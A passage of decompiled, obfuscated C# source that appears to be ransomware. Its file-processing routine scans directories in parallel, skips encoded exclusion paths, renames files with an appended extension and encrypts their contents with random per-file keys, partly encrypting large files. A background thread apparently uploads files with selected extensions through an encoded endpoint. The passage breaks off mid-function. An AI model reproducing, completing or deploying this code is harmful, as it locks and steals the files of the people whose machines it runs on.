	public static void syYQfAxPmt(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		onnLxZACFDoQRfFR.mNXzBWmdFqVDm CS_0024_003C_003E8__locals0 = new onnLxZACFDoQRfFR();
		CS_0024_003C_003E8__locals0.vgijhoARFhV = list_0;
		CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ = string_1;
		CS_0024_003C_003E8__locals0.NEFVMVTqVdkNle = string_2;
		CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX = string_3;
		CS_0024_003C_003E8__locals0.AvnPsxaqmDEjr = new List<string> { getString_0(107393216) };
		if (cHjaHHbOia == getString_0(107396888))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.vgijhoARFhV)
				{
					if (!item.Contains(onnLxZACFDoQRfFR.getString_0(107393479)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393454)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393421)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393436)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392879)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392886)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392865)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392816)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392803)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392798)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392789)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392740)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392714)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392725)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392700)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392651)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392666)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393129)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393144)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393095)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393110)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393061)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393080)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107393027)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393046)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393001)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393016)) && !item.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392967)) && !item.Contains(yasjygrGJqTJ(onnLxZACFDoQRfFR.getString_0(107392982))) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392957)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392912)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392927)) && !item.EndsWith(CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ) && !item.EndsWith(onnLxZACFDoQRfFR.getString_0(107392358)) && !item.EndsWith(onnLxZACFDoQRfFR.getString_0(107392385)) && !item.EndsWith(onnLxZACFDoQRfFR.getString_0(107392380)) && !item.EndsWith(onnLxZACFDoQRfFR.getString_0(107392375)) && !item.Contains(onnLxZACFDoQRfFR.getString_0(107392370)) && !item.Contains(xDhcruhrTvVZb) && !item.Contains(eBcYzZJOdxm) && !item.Contains(xOMcrEjNtvCmv))
					{
						if (CS_0024_003C_003E8__locals0.NEFVMVTqVdkNle.Length != 0)
						{
							string[] nEFVMVTqVdkNle2 = CS_0024_003C_003E8__locals0.NEFVMVTqVdkNle;
							int num2 = 0;
							while (num2 < nEFVMVTqVdkNle2.Length)
							{
								string value2 = nEFVMVTqVdkNle2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0bd3;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ))
							{
								goto IL_0bd3;
							}
						}
						catch (Exception)
						{
							goto IL_0bd3;
						}
						if (item.EndsWith(string_0) && !LfbVDKLAiBGoZzsY.Contains(item))
						{
							if (nSEgZCqbKaXqV == onnLxZACFDoQRfFR.getString_0(107396902))
							{
								try
								{
									if (YzwwFGKYRQ.ObGmZLtKCYVXPi(item))
									{
										YzwwFGKYRQ.zrrspuNzyYvqy(item);
									}
								}
								catch
								{
								}
							}
							LfbVDKLAiBGoZzsY.Add(item);
							if (!wGUqZKpPfawraYO.Contains(Path.GetDirectoryName(item)))
							{
								wGUqZKpPfawraYO.Add(Path.GetDirectoryName(item));
							}
							ecfiytuwBKtog(item);
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0537;
									}
									goto end_IL_0537_2;
									end_IL_0537:;
								}
								catch (Exception ex12)
								{
									if (SsCiUkhFaPaV)
									{
										try
										{
											File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + item + onnLxZACFDoQRfFR.getString_0(107406878) + ex12.Message + onnLxZACFDoQRfFR.getString_0(107396695));
										}
										catch (Exception)
										{
										}
									}
									BFoWsrHVmkbzUDmB++;
									goto end_IL_0537_2;
								}
								if (TmUHufxiasI == onnLxZACFDoQRfFR.getString_0(107396902) && new FileInfo(item).Length > Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.AvnPsxaqmDEjr.Contains(string_0))
								{
									CS_0024_003C_003E8__locals0 = new onnLxZACFDoQRfFR.YTuGDJdIYFsZ();
									CS_0024_003C_003E8__locals0.AoJYoKLZeLlp = CS_0024_003C_003E8__locals0;
									try
									{
										if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
										{
											if (bpZBDgMzOhYn)
											{
												CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ = qJZaPzetTV + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ;
											}
											File.Move(item, item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ);
										}
									}
									catch (Exception ex14)
									{
										if (SsCiUkhFaPaV)
										{
											try
											{
												File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + item + onnLxZACFDoQRfFR.getString_0(107406817) + ex14.Message + onnLxZACFDoQRfFR.getString_0(107396695));
											}
											catch (Exception)
											{
											}
										}
										BFoWsrHVmkbzUDmB++;
										goto end_IL_0537_2;
									}
									CS_0024_003C_003E8__locals0.WYnjyahANXiK = onnLxZACFDoQRfFR.getString_0(107393235);
									if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
									{
										CS_0024_003C_003E8__locals0.WYnjyahANXiK = item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ;
									}
									else
									{
										CS_0024_003C_003E8__locals0.WYnjyahANXiK = item;
									}
									if (NovBIDwMVoo == onnLxZACFDoQRfFR.getString_0(107396902))
									{
										Thread thread2 = new Thread((ThreadStart)delegate
										{
											foreach (string item2 in EDjNxpdqMiO)
											{
												if (CS_0024_003C_003E8__locals0.WYnjyahANXiK.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.AoJYoKLZeLlp.aBgVqDzNPCJQ) && PZbbmsztNpThUc == onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107396905))
												{
													if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.WYnjyahANXiK).Length)
													{
														try
														{
															OMlrSKpvSZZjN.xBtqCBaTuwIQXV(onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107393287), onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107393314), onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107393301), CS_0024_003C_003E8__locals0.WYnjyahANXiK);
														}
														catch
														{
														}
													}
												}
												else if (CS_0024_003C_003E8__locals0.WYnjyahANXiK.ToLower().EndsWith(item2) && PZbbmsztNpThUc == onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107396910))
												{
													try
													{
														OMlrSKpvSZZjN.xBtqCBaTuwIQXV(onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107393287), onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107393314), onnLxZACFDoQRfFR.YTuGDJdIYFsZ.getString_0(107393301), CS_0024_003C_003E8__locals0.WYnjyahANXiK);
													}
													catch
													{
													}
												}
											}
										});
										thread2.Priority = ThreadPriority.Normal;
										thread2.IsBackground = false;
										thread2.Start();
									}
									string text3 = HxsVTRcRgpiH.RPPZNxOHyFu(32);
									string s3 = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (PvwxfopQfRocU == onnLxZACFDoQRfFR.getString_0(107396907))
									{
										byte[] array2 = null;
										byte[] byte_2 = ufQnCLzUSY.QCdhmxBPZB(CS_0024_003C_003E8__locals0.WYnjyahANXiK, Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024);
										ufQnCLzUSY.FavttmDwCR(YILmajIKZPh: (!uBTtlGfiltatoKc) ? (dHWQzBpmcn ? ufQnCLzUSY.LLqeTUvZTvS(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ufQnCLzUSY.LLqeTUvZTvS(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dHWQzBpmcn ? cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), zglVXSzColkNb: CS_0024_003C_003E8__locals0.WYnjyahANXiK, FsywuXEZiQBBeb: bytes3);
									}
									else if (!dHWQzBpmcn)
									{
										OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.WYnjyahANXiK, CiXuUORQDucyebW, CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX);
									}
									else
									{
										OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.WYnjyahANXiK, CiXuUORQDucyebW, text3, bytes3);
									}
								}
								else
								{
									if (bpZBDgMzOhYn)
									{
										CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ = qJZaPzetTV + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ;
									}
									string text4 = HxsVTRcRgpiH.RPPZNxOHyFu(32);
									string s4 = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text4);
									byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
									if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
									{
										if (!bEJKBhTzHL)
										{
											if (!dHWQzBpmcn)
											{
												wjPMLlmajetI(item, item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, WwvaLWuUsMuy);
											}
											else
											{
												wjPMLlmajetI(item, item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text4));
											}
										}
										else
										{
											try
											{
												if (!dHWQzBpmcn)
												{
													CQSgBNnEZGz(item, item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, WwvaLWuUsMuy);
												}
												else
												{
													CQSgBNnEZGz(item, item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text4));
												}
											}
											catch (Exception ex16)
											{
												if (SsCiUkhFaPaV)
												{
													try
													{
														File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + item + onnLxZACFDoQRfFR.getString_0(107389390) + ex16.Message + onnLxZACFDoQRfFR.getString_0(107396695));
													}
													catch (Exception)
													{
													}
												}
												BFoWsrHVmkbzUDmB++;
												goto end_IL_0537_2;
											}
										}
									}
									else if (!bEJKBhTzHL)
									{
										if (!dHWQzBpmcn)
										{
											wjPMLlmajetI(item, item + onnLxZACFDoQRfFR.getString_0(107389431), WwvaLWuUsMuy);
										}
										else
										{
											wjPMLlmajetI(item, item + onnLxZACFDoQRfFR.getString_0(107389431), Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!dHWQzBpmcn)
											{
												CQSgBNnEZGz(item, item, WwvaLWuUsMuy);
											}
											else
											{
												CQSgBNnEZGz(item, item, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex18)
										{
											if (SsCiUkhFaPaV)
											{
												try
												{
													File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + item + onnLxZACFDoQRfFR.getString_0(107389390) + ex18.Message + onnLxZACFDoQRfFR.getString_0(107396695));
												}
												catch (Exception)
												{
												}
											}
											BFoWsrHVmkbzUDmB++;
											goto end_IL_0537_2;
										}
									}
									if (dHWQzBpmcn)
									{
										if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
										{
											ulbKceXLNzC(item + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, bytes4);
										}
										else
										{
											ulbKceXLNzC(item, bytes4);
										}
									}
								}
								goto IL_0bd3;
								end_IL_0537_2:;
							}
							catch (Exception)
							{
								goto IL_0bd3;
							}
						}
					}
					continue;
					IL_0bd3:
					CS_0024_003C_003E8__locals0.vgijhoARFhV.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.vgijhoARFhV, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new onnLxZACFDoQRfFR.mNXzBWmdFqVDm();
			CS_0024_003C_003E8__locals0.AoJYoKLZeLlp = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hpBPJRIyXygh = string_0;
			if (!CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393479)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393454)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393421)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393436)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392879)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392886)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392865)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392816)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392803)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392798)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392789)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392740)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392714)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392725)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392700)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392651)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392666)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393129)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393144)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393095)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393110)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393061)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393080)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107393027)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393046)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393001)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107393016)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(onnLxZACFDoQRfFR.getString_0(107392967)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(yasjygrGJqTJ(onnLxZACFDoQRfFR.getString_0(107392982))) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392957)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392912)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392927)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(onnLxZACFDoQRfFR.getString_0(107392358)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(onnLxZACFDoQRfFR.getString_0(107392385)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(onnLxZACFDoQRfFR.getString_0(107392380)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(onnLxZACFDoQRfFR.getString_0(107392375)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(onnLxZACFDoQRfFR.getString_0(107392370)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(xDhcruhrTvVZb) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(eBcYzZJOdxm) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(xOMcrEjNtvCmv))
			{
				if (CS_0024_003C_003E8__locals0.NEFVMVTqVdkNle.Length != 0)
				{
					string[] nEFVMVTqVdkNle = CS_0024_003C_003E8__locals0.NEFVMVTqVdkNle;
					int num = 0;
					while (num < nEFVMVTqVdkNle.Length)
					{
						string value = nEFVMVTqVdkNle[num];
						if (!CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d56;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ))
					{
						goto IL_0d56;
					}
				}
				catch (Exception)
				{
					goto IL_0d56;
				}
				if (!LfbVDKLAiBGoZzsY.Contains(CS_0024_003C_003E8__locals0.hpBPJRIyXygh))
				{
					if (nSEgZCqbKaXqV == onnLxZACFDoQRfFR.getString_0(107396902))
					{
						try
						{
							if (YzwwFGKYRQ.ObGmZLtKCYVXPi(CS_0024_003C_003E8__locals0.hpBPJRIyXygh))
							{
								YzwwFGKYRQ.zrrspuNzyYvqy(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
							}
						}
						catch
						{
						}
					}
					LfbVDKLAiBGoZzsY.Add(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
					if (!wGUqZKpPfawraYO.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hpBPJRIyXygh)))
					{
						wGUqZKpPfawraYO.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hpBPJRIyXygh));
					}
					ecfiytuwBKtog(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hpBPJRIyXygh).Length != 0L)
							{
								goto end_IL_0656;
							}
							goto end_IL_0656_2;
							end_IL_0656:;
						}
						catch (Exception ex2)
						{
							if (SsCiUkhFaPaV)
							{
								try
								{
									File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + onnLxZACFDoQRfFR.getString_0(107406878) + ex2.Message + onnLxZACFDoQRfFR.getString_0(107396695));
								}
								catch (Exception)
								{
								}
							}
							BFoWsrHVmkbzUDmB++;
							goto end_IL_0656_2;
						}
						if (TmUHufxiasI == onnLxZACFDoQRfFR.getString_0(107396902) && new FileInfo(CS_0024_003C_003E8__locals0.hpBPJRIyXygh).Length > Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
								{
									if (bpZBDgMzOhYn)
									{
										CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ = qJZaPzetTV + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ;
									}
									File.Move(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ);
								}
							}
							catch (Exception ex4)
							{
								if (SsCiUkhFaPaV)
								{
									try
									{
										File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + onnLxZACFDoQRfFR.getString_0(107406817) + ex4.Message + onnLxZACFDoQRfFR.getString_0(107396695));
									}
									catch (Exception)
									{
									}
								}
								BFoWsrHVmkbzUDmB++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
							{
								CS_0024_003C_003E8__locals0.hpBPJRIyXygh += CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ;
							}
							if (NovBIDwMVoo == onnLxZACFDoQRfFR.getString_0(107396902))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in EDjNxpdqMiO)
									{
										if (CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.AoJYoKLZeLlp.aBgVqDzNPCJQ) && PZbbmsztNpThUc == onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107396908))
										{
											if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hpBPJRIyXygh).Length)
											{
												try
												{
													OMlrSKpvSZZjN.xBtqCBaTuwIQXV(onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107393290), onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107393317), onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107393304), CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().EndsWith(item3) && PZbbmsztNpThUc == onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107396913))
										{
											try
											{
												OMlrSKpvSZZjN.xBtqCBaTuwIQXV(onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107393290), onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107393317), onnLxZACFDoQRfFR.mNXzBWmdFqVDm.getString_0(107393304), CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = HxsVTRcRgpiH.RPPZNxOHyFu(32);
							string s = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (PvwxfopQfRocU == onnLxZACFDoQRfFR.getString_0(107396907))
							{
								byte[] array = null;
								byte[] byte_ = ufQnCLzUSY.QCdhmxBPZB(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024);
								ufQnCLzUSY.FavttmDwCR(YILmajIKZPh: (!uBTtlGfiltatoKc) ? (dHWQzBpmcn ? ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dHWQzBpmcn ? cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), zglVXSzColkNb: CS_0024_003C_003E8__locals0.hpBPJRIyXygh, FsywuXEZiQBBeb: bytes);
							}
							else if (!dHWQzBpmcn)
							{
								OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CiXuUORQDucyebW, CS_0024_003C_003E8__locals0.NRMuHnCdQTWUX);
							}
							else
							{
								OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CiXuUORQDucyebW, text, bytes);
							}
						}
						else
						{
							if (bpZBDgMzOhYn)
							{
								CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ = qJZaPzetTV + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ;
							}
							string text2 = HxsVTRcRgpiH.RPPZNxOHyFu(32);
							string s2 = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
							{
								if (!bEJKBhTzHL)
								{
									if (!dHWQzBpmcn)
									{
										wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, WwvaLWuUsMuy);
									}
									else
									{
										wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!dHWQzBpmcn)
										{
											CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, WwvaLWuUsMuy);
										}
										else
										{
											CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (SsCiUkhFaPaV)
										{
											try
											{
												File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + onnLxZACFDoQRfFR.getString_0(107389390) + ex6.Message + onnLxZACFDoQRfFR.getString_0(107396695));
											}
											catch (Exception)
											{
											}
										}
										BFoWsrHVmkbzUDmB++;
										return;
									}
								}
							}
							else if (!bEJKBhTzHL)
							{
								if (!dHWQzBpmcn)
								{
									wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + onnLxZACFDoQRfFR.getString_0(107389431), WwvaLWuUsMuy);
								}
								else
								{
									wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + onnLxZACFDoQRfFR.getString_0(107389431), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!dHWQzBpmcn)
									{
										CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh, WwvaLWuUsMuy);
									}
									else
									{
